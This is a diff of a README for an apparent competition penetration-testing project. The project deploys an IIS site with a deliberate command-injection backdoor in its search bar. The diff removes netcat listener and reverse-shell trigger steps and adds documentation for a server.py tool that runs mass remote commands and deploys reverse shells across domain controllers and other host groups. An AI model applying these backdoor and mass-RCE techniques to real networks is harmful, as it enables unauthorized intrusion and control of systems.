@@ -68,9 +68,7 @@ This project demonstrates advanced penetration testing techniques against IIS we
   sudo add-apt-repository ppa:ansible/ansible --yes --update
   sudo apt install ansible
   sudo apt install python3-pip
-  ansible-galaxy collection install ansible.windows community.windows
   pip install inquirerpy
-  pip install pywinrm
   ```
 
 ### Steps
@@ -123,40 +121,51 @@ Edit the iis_setup.yml file to include the name of the Competition:
 To set up the IIS server and deploy the website, execute the following command:
 
 ```sh
-ansible-playbook -i inventory.yml iis_setup.yml
+ansible-playbook -i inventory.yml iis_setup.yml -f 50
 ```
 
-## 5a. Spawn a Reverse Shell (Singular Execution)
-To spawn a reverse shell, follow these steps:
+## 5. Remote Code Execution
+For remote command execution and reverse shell deployment, use the included `server.py` Python tool.
 
-1. **Set Up a Listener**: On your machine, start a listener using a tool like `netcat`. For example:
-   ```bash
-   nc -lvnp [PORT]
-   ```
-2. **Trigger the Reverse Shell**: Once the deployment is complete, open your browser and navigate to: http://your_server_ip/. On the deployed website, locate the search bar. Enter the following command:
-    ```html
-    search [YOUR_IP] [PORT]
-    ```
-    Replace `[YOUR_IP]` with your machine's IP address and `[PORT]` with the port you are listening on (e.g., `8080`).
-
-3. **Gain Access**: Once the command is executed, a system shell will be spawned, and you will have access to the target machine.
-
-## 5b. OS Command Injection (Mass Execution)
-For large-scale operations or testing multiple targets simultaneously, use the included `server.py` Python script to automate command execution across multiple compromised hosts.
-
-### Server.py Features
-- **Mass RCE**: Execute commands on multiple targets simultaneously
-- **Concurrent Processing**: Handle multiple connections efficiently
-- **Command Queueing**: Queue commands for execution across all connected hosts
-- **Real-time Output**: Live output from all connected systems
-- **Session Management**: Track active reverse shell sessions
+### Features
+- **Singular Command Execution**: Run commands on individual targets
+- **Mass Command Execution**: Execute commands across multiple targets simultaneously
+- **Reverse Shell Deployment**: Spawn reverse shells to your listener
+- **Target Group Management**: Pre-defined groups for different host types
+- **Real-time Results**: Live output from all connected systems
 
 ### Usage
 
-#### Starting the Mass RCE Server
-```bash
-# Start the RCE server on a specific port
-python server.py -p 8888
+#### Starting the Tool
+```sh
+python3 server.py
+```
 
-# Or use default port 8888
-python server.py
+#### Available Actions
+- **Singular Remote Code Execution**: Execute commands on single targets
+- **Mass Remote Code Execution**: Run commands across target groups
+- **Spawn a Reverse Shell**: Deploy reverse shells
+
+#### Target Groups
+- **All Hosts**
+- **Domain Controllers**
+- **IIS Hosts**
+- **WinRM Hosts**
+- **ICMP Hosts**
+- **SMB Hosts**
+- **Custom Targets (Manual IP input)**
+
+Note: The target IP addresses in server.py are pre-configured for a specific network environment (192.168.X.X and 10.X.1.X ranges). You may need to modify the ALL_HOSTS, ALL_DC, ALL_IIS, ALL_WINRM, ALL_ICMP, and ALL_SMB arrays in the script to match your target network configuration.
+
+#### Example Usage
+```bash
+# Check privileges across all IIS servers
+> Select "Mass Remote Code Execution"
+> Choose "All IIS Hosts"
+> Enter command: whoami /priv
+
+# Deploy reverse shell to specific target
+> Select "Spawn a Reverse Shell"
+> Enter target: 192.168.4.3
+> Enter listener: 10.65.0.10:6767
+```
